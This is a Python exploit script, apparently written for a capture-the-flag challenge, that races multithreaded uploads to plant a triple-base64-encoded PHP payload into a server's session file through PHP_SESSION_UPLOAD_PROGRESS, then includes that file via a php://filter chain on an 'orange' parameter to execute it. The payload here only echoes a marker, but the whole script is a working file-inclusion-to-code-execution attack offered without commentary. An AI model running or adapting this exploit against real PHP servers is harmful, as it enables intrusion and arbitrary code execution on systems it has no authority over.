import string
import requests
from base64 import b64encode
from random import sample, randint
from multiprocessing.dummy import Pool as ThreadPool
from threading import Event, Lock

HOST = 'http://19326f94-a178-43a4-bc8a-9e386d9d44b5.node.pediy.com:81/'
sess_name = 'iamorange'
headers = {
    'Connection': 'close',
    'Cookie': 'PHPSESSID=' + sess_name,
}
marker = 'WCOK123'
payload = '@<?php echo "' + marker + '";?>'

while True:
    junk = ''.join(sample(string.ascii_letters, randint(8, 16)))
    raw = (payload + junk).encode()
    x = b64encode(raw)
    xx = b64encode(x)
    xxx = b64encode(xx)
    if b'=' not in x and b'=' not in xx and b'=' not in xxx:
        payload = xxx.decode()
        print('payload:', payload)
        break

found = Event()
lock = Lock()
results = []

def runner1(i):
    data = {
        'PHP_SESSION_UPLOAD_PROGRESS': 'ZZ' + payload + 'Z'
    }
    s = requests.Session()
    s.headers.update(headers)
    while not found.is_set():
        try:
            with open('/etc/passwd', 'rb') as fp:
                s.post(HOST, files={'f': fp}, data=data, timeout=15)
        except Exception:
            pass


def runner2(i):
    filename = '/var/lib/php/sessions/sess_' + sess_name
    filename = 'php://filter/convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=%s' % filename
    s = requests.Session()
    s.headers.update(headers)
    while not found.is_set():
        try:
            r = s.get(HOST, params={'orange': filename}, timeout=3)
            c = r.text
        except Exception:
            continue
        if c and 'orange' not in c and '<code><span style="color: #000000">' not in c:
            with lock:
                results.append(c[:500])
            print('HIT:', repr(c[:300]))
            if marker in c:
                found.set()
                return


def main(mode='both'):
    if mode == '1':
        runner = runner1
        pool = ThreadPool(32)
        pool.map_async(runner, range(32)).get(0xffff)
    elif mode == '2':
        runner = runner2
        pool = ThreadPool(32)
        pool.map_async(runner, range(32)).get(0xffff)
    else:
        pool1 = ThreadPool(16)
        pool2 = ThreadPool(16)
        r1 = pool1.map_async(runner1, range(16))
        r2 = pool2.map_async(runner2, range(16))
        try:
            r1.get(90)
            r2.get(90)
        except Exception:
            pass
        print('found', found.is_set(), 'results', len(results))
        for item in results[:10]:
            print('sample', repr(item))

if __name__ == '__main__':
    main('both')
